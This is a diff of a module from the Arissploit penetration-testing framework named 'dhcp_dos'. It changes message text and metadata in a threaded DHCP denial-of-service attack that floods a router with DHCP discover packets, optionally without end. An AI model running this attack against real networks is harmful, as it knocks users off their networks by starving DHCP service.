@@ -1,5 +1,3 @@
-
-
 from core.arissploit import *
 from core import colors
 import threading, queue
@@ -10,10 +8,8 @@ import random
 conf = {
 	"name": "dhcp_dos", # Module's name (should be same as file name)
 	"version": "1.0", # Module version
-	"shortdesc": "dhcp denial of service", # Short description
-	"github": "entynetproject", # Author's github
-	"author": "entynetproject", # Author
-	"email": "entynetproject0@gmail.com", # Email
+	"shortdesc": "DHCP denial of service.", # Short description
+	"author": "Entynetproject", # Author
 	"initdate": "01.01.2017", # Initial date
 	"lastmod": "01.01.2017", # Last modification
 	"apisupport": False, # Api support
@@ -22,8 +18,8 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('router', ['192.168.1.1', 'router ip address']),
-	('packet_count', ['100', 'count of packets [0 = infinite]']),
+	('router', ['192.168.1.1', 'Router ip address.']),
+	('packet_count', ['100', 'Count of packets [0 = infinite].']),
 ))
 
 # Simple changelog
@@ -50,11 +46,11 @@ class DhcpRequest(threading.Thread):
 		sendp(dhcp_discover, verbose=0)
 
 def run():
-	printInfo("attack has been started...")
+	printInfo("Attack has been started...")
 	try:
 		last = int(variables["packet_count"][0])
 	except ValueError:
-		printError("invalid packets count")
+		printError("Invalid packets count!")
 	threads = []
 	try:
 		if last != 0:
@@ -71,7 +67,7 @@ def run():
 				threads.append(dhcpr)
 				i += 1
 	except KeyboardInterrupt:
-		printInfo("kill signal received stopping attack...")
+		printInfo("Kill signal received stopping attack...")
 		for thread in threads:
 			thread.join()
-	printInfo("attack ended")
+	printInfo("Attack ended!")
